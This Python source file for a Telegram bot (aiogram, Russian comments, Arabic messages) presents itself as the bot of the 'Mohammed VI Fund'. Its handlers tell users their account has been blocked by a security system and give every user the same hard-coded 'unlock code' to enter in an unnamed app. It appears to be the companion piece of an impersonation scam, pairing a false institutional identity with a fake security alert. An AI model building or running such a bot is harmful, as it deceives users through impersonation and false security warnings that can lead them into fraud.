import os
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# Получаем токен из переменной окружения Render
TOKEN = os.environ.get("TELEGRAM_TOKEN")

# Проверка, что токен есть
if not TOKEN:
    raise ValueError("Не найден TELEGRAM_TOKEN. Добавьте его в Environment Variables на Render.")

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Команда /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("ابدأ")  # "Начать"
    await message.answer(
        "مرحبًا! يرحب بك بوت صندوق محمد السادس.\nاختر الزر أدناه للمتابعة.",
        reply_markup=keyboard
    )

# Кнопка "ابدأ" ("Начать")
@dp.message_handler(lambda msg: msg.text == "ابدأ")
async def begin(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("حظر الحساب")  # "Блокировка аккаунта"
    await message.answer(
        "مرحبًا! يرحب بك بوت صندوق محمد السادس.\nاختر الزر أدناه للمتابعة.",
        reply_markup=keyboard
    )

# Кнопка "حظر الحساب" ("Блокировка аккаунта")
@dp.message_handler(lambda msg: msg.text == "حظر الحساب")
async def blocked(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("احصل على الرمز")  # "Получить код"
    keyboard.add("العودة للخلف")    # "Вернуться назад"
    await message.answer(
        "تم حظر حسابك مؤقتًا بواسطة نظام الأمان.\nلإلغاء الحظر، احصل على رمز فريد بالزر أدناه.",
        reply_markup=keyboard
    )

# Кнопка "احصل على الرمز" ("Получить код")
@dp.message_handler(lambda msg: msg.text == "احصل على الرمز")
async def get_code(message: types.Message):
    code = 11457  # фиксированный код
    await message.answer(
        f"🛡️ رمز فك القفل الخاص بك: {code}\n"
        "أدخله في التطبيق لاستعادة الوصول إلى حسابك."
    )

# Кнопка "العودة للخلف" ("Вернуться назад")
@dp.message_handler(lambda msg: msg.text == "العودة للخلف")
async def go_back(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("حظر الحساب")
    await message.answer(
        "مرحبًا! يرحب بك بوت صندوق محمد السادس.\nاختر الزر أدناه للمتابعة.",
        reply_markup=keyboard
    )

# Обработка любых других сообщений
@dp.message_handler()
async def unknown_message(message: types.Message):
    await message.answer("الرجاء استخدام الأزرار المتاحة أدناه.")  # "Пожалуйста, используйте кнопки ниже."

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
